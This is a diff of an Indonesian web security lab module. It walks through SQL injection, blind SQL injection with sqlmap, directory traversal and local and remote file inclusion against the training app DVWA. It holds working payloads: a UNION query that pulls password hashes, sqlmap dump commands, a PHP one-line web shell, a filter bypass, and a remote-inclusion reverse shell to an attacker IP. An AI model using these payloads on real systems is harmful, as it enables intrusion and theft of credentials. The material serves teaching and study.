@@ -45,7 +45,7 @@ Syntax tersebut digunakan untuk melakukan query ke sebuah tabel Users dalam suat
    * Kesalahan yang diberikan oleh aplikasi web dapat memberikan petunjuk tentang kerentanan SQL Injection.
   
 #### Pesan dari Error messages yang dapat kita ambil
-![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/16a49d95-5b58-4fe4-9fa3-7364fc02eeeb)
+![Error Message SQL](src/ErrorMesageSQL.png)
 
 * Masing-masing DBMS (Database Management System) memiliki error messages yang unik
 * Mengenal DBMS yang digunakan membuat penyerang memiliki kemampuan untuk menyesuaikan serangan secara khusus ke DBMS tersebut.
@@ -58,30 +58,32 @@ Syntax tersebut digunakan untuk melakukan query ke sebuah tabel Users dalam suat
 > Task: Curi password dari users yang terdapat dalam database DVWA dengan menggunakan sql. Total users dalam database adalah 5 users dengan id dari 1 hingga 5.
 
 Cara: 
-1. Kita aktifkan dulu `apache2` dan `mysql` pada kali linux  
-    <img width="213" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/c8f21ed8-30fe-47d1-ae95-38e98e55f33b">  
 
-2. Kita masuk ke website dvwa dengan url `http://127.0.0.1/DVWA/login.php`  
-    <img width="380" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/4bd672bf-40d1-4a5d-bd80-a706a7745a66">
+1. Cek IP dari DVWA di vm metasploitable menggunakan command 
+```
+ifconfig
+```
+cari ip dengan awalan 192
+
+2. Kita masuk ke website dvwa dengan url `http://ip_dvwa/DVWA/login.php`  
+    ![DVWA](src/DVWA.png)
 
 3. Kita lakukan login dengan `username: admin` dan `password: password`  
 
-    <img width="793" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/ade9d7b1-f53a-4035-83dc-fdd0c7eca538">
-
 4. Kita set `security level: low`  
 
-   <img width="478" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/725b04eb-5f97-407f-aac8-b0e50ad975dc">
+   ![LowSec](src/LowSec.png)
 
 5. Kita masuk ke tab `SQL Injection`  
 
-   <img width="549" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/d5b47694-f22d-4ac1-a339-3ac96608b603">
+   ![SQLISec](src/SQLISEC.png)
 
 6. Saat kita masukkan salah satu id, misal `id = 1`, maka akan terlihat seperti ini:  
-    <img width="283" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/f75e7b39-62da-409b-b39d-1b4e65f4aba6">
+
+   ![SQLI1](src/SQLI1.png)
 
 7. Kita bedah source codenya:  
 
-   ![sql_injection](https://raw.githubusercontent.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/master/src/injection.png)
 
 * Dari kode tersebut, apapun yang kita inputkan akan masuk menjadi query dan akan diproses. Sebab, isi dari variabel query:  
 
@@ -93,16 +95,16 @@ Cara:
   ``` SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT password, null FROM users -- '; ```  
 
 * Setelah itu, kita masukkan ke text input `User ID`  
-  `1' UNION SELECT password, null FROM users -- '; ``` `  
+  `1' UNION SELECT password, null FROM users -- '; `  
 
-  Disini, attacker memasukkan syntax tersembunyi yang dibuat menjadi comment yaitu `' UNION SELECT password, null FROM users -- '; `` `. Sehingga, apabila web rentan, maka union tidak akan terdeteksi.  
+  Disini, attacker memasukkan syntax tersembunyi yang dibuat menjadi comment yaitu ` UNION SELECT password, null FROM users -- '; `. Sehingga, apabila web rentan, maka union tidak akan terdeteksi.  
 
 8. Hasil serangan:  
-   <img width="398" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/a66c2bd3-32c0-47a5-aacf-245a7c602306">
+   ![SQLI2](src/SQLI2.png)
 
 9. Password tersebut dibuat dengan hashcode sehingga kita dapat generate hashcode tersebut di `crackstation.net`  
 
-    <img width="557" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/caae5d84-6c7f-4565-b203-c8ab648bba77">
+   ![SQLI3](src/SQLI3.png) 
 
 ### Serangan di DVWA dengan security level medium
 
@@ -111,10 +113,10 @@ Cara:
 Cara:
 1. Ubah difficulty serangan menjadi medium pada tab `DVWA Security`  
 
-![change diff](src/difficulty.png)
+![change diff](./src/difficulty.png)
 
 2. Buka tab `SQL Injection` dan lihat source nya  
->![source](src/source.png)  
+>![source](./src/source.png)    
 >Dapat dilihat bahwa pada bagian pengeksekusian query hampir sama dengan diff low hanya saja pada `$id` tidak ada tanda petik serta pengiriman data menggunakan _POST sehingga query yang akan di inject akan sedikit berbeda
 
 3. Query yang akan di inject berupa:  
@@ -131,17 +133,17 @@ Cara:
 4. Injek query yang sudah disiapkan melalui `inspect`  
 >Kenapa menggunakan `inspect`? karena field id berupa optian bukan textbox sehingga tidak dapat mengetik secara langsung  
 
->![inspect](src/inspect.png)  
+>![inspect](./src/inspect.png)  
 >tahapan inspect:
 >
 >klik kanan, pilih inspect, klik icon kotak-kursor pada bagian pojok kiri atas jendela inspect, lalu klik field option id  
 
->![query injection](src/injection.png)  
+>![query injection](./src/injection.png)  
 >letakkan query kedalam value pada salah satu tag option
 
 5. Tekan tombol Submit dan hasilnya akan keluar  
 
->![hasil](src/hasil.png)  
+>![hasil](./src/hasil.png)  
 >hasil injeksi dapat dilihat pada baris data setelah baris pertama (admin/admin)
 >
 >first_name = first_name
@@ -260,30 +262,79 @@ $results = DB::select( DB::raw("SELECT * FROM some_table WHERE some_col = :somev
 > Disini, kita gunakan OS Kali Linux
 > Task: Menemukan kode yang tepat sesuai dengan versi dari sql database software melalui blind sql attack. Sebab, biasanya kalau syntax tidak sesuai akan muncul eror
 
-Cara:
-1. Kita aktifkan dulu `apache2` dan `mysql` pada kali linux  
-    <img width="213" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/c8f21ed8-30fe-47d1-ae95-38e98e55f33b">  
-
-2. Kita masuk ke website dvwa dengan url `http://127.0.0.1/DVWA/login.php`  
-    <img width="380" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/4bd672bf-40d1-4a5d-bd80-a706a7745a66">  
+Cara: 
+1. Cek IP dari DVWA di vm metasploitable menggunakan command 
+```
+ifconfig
+```
+cari ip dengan awalan 192
+2. Kita masuk ke website dvwa dengan url `http://ip_dvwa/DVWA/login.php`  
+    ![DVWA](src/DVWA.png)
 
 3. Kita lakukan login dengan `username: admin` dan `password: password`  
 
-    <img width="793" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/ade9d7b1-f53a-4035-83dc-fdd0c7eca538">  
-
 4. Kita set `security level: low`  
 
-    <img width="444" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/4c712f9d-0643-48bb-844a-f0fb518db834">  
-
+   ![LowSec](src/LowSec.png)
 
 5. Kita masuk ke tab `SQL Injection (Blind)`  
 
-   <img width="463" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/0dc7f977-d613-4e67-acb3-8ed1fc412b7f">  
+   ![SQLBlind](src/SQLB1.png)
 
 6. Kita perhatikan source codenya:  
 
-   ![3](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/0ac82a61-f377-40fd-831d-0f92e04ba2d5)  
+``` php
+<?php
+if( isset( $_GET[ 'Submit' ] ) ) {
+    // Get input
+    $id = $_GET[ 'id' ];
+    $exists = false;
 
+    switch ($_DVWA['SQLI_DB']) {
+        case MYSQL:
+            // Check database
+            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ); // Removed 'or die' to suppress mysql errors
+
+            $exists = false;
+            if ($result !== false) {
+                try {
+                    $exists = (mysqli_num_rows( $result ) > 0);
+                } catch(Exception $e) {
+                    $exists = false;
+                }
+            }
+            ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
+            break;
+        case SQLITE:
+            global $sqlite_db_connection;
+
+            $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+            try {
+                $results = $sqlite_db_connection->query($query);
+                $row = $results->fetchArray();
+                $exists = $row !== false;
+            } catch(Exception $e) {
+                $exists = false;
+            }
+
+            break;
+    }
+
+    if ($exists) {
+        // Feedback for end user
+        echo '<pre>User ID exists in the database.</pre>';
+    } else {
+        // User wasn't found, so the page wasn't!
+        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
+
+        // Feedback for end user
+        echo '<pre>User ID is MISSING from the database.</pre>';
+    }
+
+}
+?> 
+```
 
 * Dari kode tersebut, setelah kita menekan tombol `Submit` maka akan mengambil `ID` dari method `GET` lalu akan mengeksekusi query yang menampilkan `first_name` dan `last_name`.
 
@@ -294,47 +345,48 @@ Cara:
    * Kita ingin cek apakah terdapat `User ID: 1` pada database tersebut dengan cara:
      > http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1' and 1=1 -- -'7&Submit=Submit#  
          Hasilnya:  
-         <img width="459" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/5a44ebe2-d7da-4942-9c60-c52f582826a6">  
+         ![SQLB2](src/SQLB2.png)
 
      > Url tersebut berarti id=1 dapat dicari apabila nilai 1=1
      > Apabila nilai 1=0, maka hasilnya salah. Hal tersebut, dibuktikan dengan:  
-         <img width="460" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/c95d6221-bd47-4a31-8740-9e6035bb7c83">
+         ![SQLB3](src/SQLB3.png)
+
    * Kita ingin mengetahui kata pertama dari data di database itu. Bisa dengan cara modifikasi pada inputan `User ID`, seperti ini:
 
      > 1' and (select substring(database(), 1, 1))="a" -- -'      
-         <img width="334" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/290a3ccb-db45-48a0-8cf0-6cc6b173879c">    
+ 
          Maka hasilnya:    
-         <img width="467" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/7992d310-eb37-4dc4-9214-f9f16244a71a">  
+         ![SQLB4](src/SQLB4.png)
 
      > Lalu saat kita ubah jadi huruf lain, dengan:  
          1' and (select substring(database(), 1, 1))="d" -- -'    
-         <img width="338" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/f70056ea-4350-4160-917d-394320fba5a0">    
+         ![SQLB5](src/SQLB5.png) 
          Maka hasilnya:    
-            <img width="336" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/30474fef-ab7b-4701-af26-d5b60f5c308e">  
+            ![SQLB6](src/SQLB6.png) 
          Artinya: kata pertama dari id=1 pada database adalah `d`  
     * Kita ingin mengetahui kata kedua dari data di database. Bisa dengan cara modifikasi pada inputan `User ID`, seperti ini:   
       > 1' and (select substring(database(), 2, 1))="a" -- -'  
-          <img width="342" alt="image" src="https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/91377782/d8e2ea18-daae-4669-89a1-d8f30d9dac22">  
+          ![SQLB7](src/SQLB7.png) 
       > Kita tebak dari a hingga z, mana huruf yang cocok. Jika cocok, maka huruf tersebut merupakan kata kedua dari User ID tersebut. 
 
 ### Serangan di DVWA dengan security level medium
 1. Ubah difficulty serangan menjadi medium pada tab `DVWA Security`  
 
-![change diff](src/blind_diff.png)
+![change diff](./src/blind_diff.png)
 
 2. Buka tab `SQL Injection (Blind)` kemudian inspect, pilih tab network, lalu klik submit  
 
-![network](src/blind_network.png)
+![network](./src/blind_network.png)
 
 3. Pilih data teratas dan catat cookies dan raw requestnya
 >Pilih tab `Cookies` pada bagian bawah untuk melihat cookies yang ada  
->![cookies](src/blind_cookies.png)
+>![cookies](./src/blind_cookies.png)
 
 >Pilih tab `Request` pada bagian bawah lalu tekan togle `Raw` untuk melihat raw request yang dikirimkan  
->![request](src/blind_request.png)
+>![request](./src/blind_request.png)
 
 >catat dengan format yang sesuai pada gambar dibawah  
->![note](src/blind_note.png)
+>![note](./src/blind_note.png)
 
 4. Buka terminal dan jalankan command sqlmap berikut:
 ```
@@ -348,7 +400,7 @@ sqlmap -u "[url]" --cookie="[cookies]" --data="[request]" --dbms --batch
 >
 >`[request]` = raw request yang telah dicatat sesuai format 
   
-![sqlmap1](src/blind_sqlmap1.png)
+![sqlmap1](./src/blind_sqlmap1.png)
 Didapatkan daftar database yang ada pada server
 ```
 [*] dvwa
@@ -361,7 +413,7 @@ sqlmap -u "[url]" --cookie="[cookies]" --data="[request]" -D dvwa --tables --bat
 ```
 >command di atas akan menampilkan tabel yang ada dalam database dvwa  
 
-![sqlmap2](src/blind_sqlmap2.png)
+![sqlmap2](./src/blind_sqlmap2.png)
 
 6. Ubah lagi command sqlmap sebelumnya untuk menampilkan data dalam tabel users
 ```
@@ -369,7 +421,7 @@ sqlmap -u "[url]" --cookie="[cookies]" --data="[request]" -D dvwa -T users --dum
 ```
 >--dump digunakan untuk menampilkan semua data didalam sebuah tabel  
 
-![sqlmap3](src/blind_sqlmap3.png)
+![sqlmap3](./src/blind_sqlmap3.png)
 >karena enkripsi password yang sederhana menggunakan `md5`, sqlmap secara otomatis mendekripsi semua password yang ada
 
 ## Directory Traversal Vulnerabilities
@@ -401,11 +453,11 @@ Menurut anda, apa yang akan anda lakukan sebagai penyerang untuk dapat mengakses
 
 Input yang tidak tersanitasi dan cara menampilkan file dengan cara yang kurang baik dapat menyebabkan munculnya kelemahan Directory Traversal, sebagai contoh pada kasus di DVWA berikut
 
-![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/d4f19259-df66-43a7-9bf2-260c7c998dc1)
+![File Inclusion Section](src/FileInclusionSection.png)
 
 bila kita lihat dari kode sumbernya:
 
-![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/f6579729-d985-40dc-af9d-698727981c5c)
+![Alt text](src/FI_Source_Code.png)
 
 Input parameter 'page' dari user tidak disanitasi dengan baik, sehingga apabila kita memasukkan input seperti:
 
@@ -415,7 +467,7 @@ Input parameter 'page' dari user tidak disanitasi dengan baik, sehingga apabila 
 
 Akan menampilkan file seperti berikut:
 
-![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/e84cfee8-e662-43b0-b9b6-86db265d1672)
+![Alt text](src/DirTraverse.png)
 
 File tersebut menampilkan siapa saja user yang beroperasi dalam sistem, terlihat tidak terlalu berbahaya bukan? Bagaimana apabila kasusnya kita ganti menjadi seperti ini:
 
@@ -433,7 +485,7 @@ admin@gmail.com   Djum4nt0sup3r
 ```
 Haislnya bisa seperti berikut:
 
-![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/a035e986-6ce1-407e-9c76-31682e64db00)
+![Cred Leak](src/DirTravCredLeak.png)
 ## File Inclusion Vulnerabilities
 
 ### Deskripsi
@@ -497,7 +549,7 @@ Mirip dengan Local File Inclusion, bedanya Remote File Inclusion berarti penyera
 
 
 ### Demo Kerentanan File Inclusion
-Pada kasus ini, anggap seorang hacker telah berhasil memasukkan file berbahaya kedalam sistem, baik melalui fitur dalam website atau menggunakan cara lain. Scriptt yang dimasukkan oleh si hacker merupakan file bernama **malscript.php** yang berisi kode berikut:
+Pada kasus ini, anggap seorang hacker telah berhasil memasukkan file berbahaya kedalam sistem, baik melalui fitur dalam website atau menggunakan cara lain. Script yang dimasukkan oleh si hacker merupakan file bernama **malscript.php** yang berisi kode berikut:
 
 ```php
 <?php system($_GET['cmd']);?>
@@ -509,10 +561,9 @@ Kode ini akan melakukan perintah server sesuai dengan masukan yang diberikan pad
 
    <!-- FILE INCLUSION SECTION IN DVWA IMAGE --!>
 
-- Terdapat 3 opsi file yang ketika ditekan akan menampilkan isi dari file tersebut
-- Pilih salah satu, dan anda bisa melihat bahwa nama dari file akan muncul di request parameter
+- Lihat pada URL
 ```
-http://ip_mesin/vulnerabilities/fi/?page=file1.php
+http://ip_mesin/dvwa/vulnerabilities/fi/?page=include.php
 ```
 
 #### LOCAL FILE INCLUSION PAYLOAD
@@ -531,39 +582,40 @@ Sehingga pada url menajdi seperti berikut
 - Klik enter
 - Maka konten dari file akan muncul seperti di bawah
 
-![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/0b967496-98d7-49fb-a60c-8ef16f59c1e0)
+![FI to RCE](src/FI2RCE.png)
 
 #### REMOTE FILE INCLUSION PAYLOAD
 
 Mirip dengan Local File Inclusion, pada **Remote File Inclusion (RFI)**, file yang ada berasal dari luar server, alias berasal dari server penyerang. Untuk mengetahui apakah RFI bisa terjadi, mirip seperti dengan Local File Inclusion.
 Sebagai percobaan, ganti value pada parameter **?page=**, menjadi http://google.com atau http://imdb.com, maka berikut hasil yang akan ditampilkan:
 
-![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/3e759721-0604-44bd-b48a-b3774d33699a)
+![RFI1](src/RFI1.png)
 
-![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/672f8a0c-3497-4192-af7a-ab6e272dda5e)
+![RFI2](src/RFI2.png)
 
 ####  Untuk level Medium
 Sekarang, ganti level ke level medium dengan cara:
 - Masuk ke section DVWA Security
 - Lalu ganti kesulitan menjadi medium dan klik submit
 
-![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/ddc9c0b4-782d-4031-a7f4-4a69e46fee54)
+![RFI3](src/RFI3.png)
 
 - Kembali ke section File Inclusion
 - Klik **View Source**
 - Berikut merupakan contoh upgrade securitynya
 
-![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/7591d17e-c849-4365-8ca0-a2cb7226509f)
+![MediumFI](src/MediumFI.png)
 
 Cara ini masih bisa diBypass dengan cara mengganti **http://**, menjadi hthttp://tp://. Berikut pembuktiannya:
 
 - Ketika menggunakan http://google.com biasa
 
-![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/ad98e0a2-b0b9-4d5e-a844-5d8b81f06708)
+![RFI3](src/RFI3.png)
+http://google.com terpotong menjadi google.com, membuat website tidak bisa diakses
 
 - Ketika menggunakan cara lain seperti hthttp://tp://google.com
 
-![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/6cd799cc-83f4-4dab-8133-7a008b658109)
+![RFI4](src/RFI4.png)
 
 - Keamanan berhasil dibypass
 
@@ -576,7 +628,7 @@ IP penyerang 192.168.111.128
 
 Berikut contoh isi file dalam server:
 
-![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/227d206d-594c-4e72-b2bc-299207b72870)
+![ListFileFI](src/ListFileFI.png)
 
 Dalam server penyerang, telah disiapkan file bernama info.txt untuk masuk kedalam server seperti berikut:
 
@@ -587,15 +639,15 @@ Kode ini memiliki fungsi untuk membuka koneksi dari server ke server penyerang, 
 
 Penyerang saat ini sedang menunggu koneksi di port 1234
 
-![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/41d6c3d1-c9cc-462b-8bf3-8feb1d1366e1)
+![FIWaitConnect](src/FIWaitConnect.png)
 
 Ketika server memiliki kelemahan File Inclusion, penyerang dapat memasukkan alamat dan file dari penyerang seperti berikut:
 
-![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/44e5cd47-ada2-445f-bd1a-54e0072bfe32)
+![RFI5](src/RFI5.png)
 
 Hasilnya seperti berikut:
 
-![image](https://github.com/arsitektur-jaringan-komputer/Modul-Web-App-Security/assets/100863813/36f463f8-f00a-4877-b6bb-fca035801deb)
+![RFI6](src/RFI6.png)
 
 Penyerang berhasil masuk ke dalam server.
 
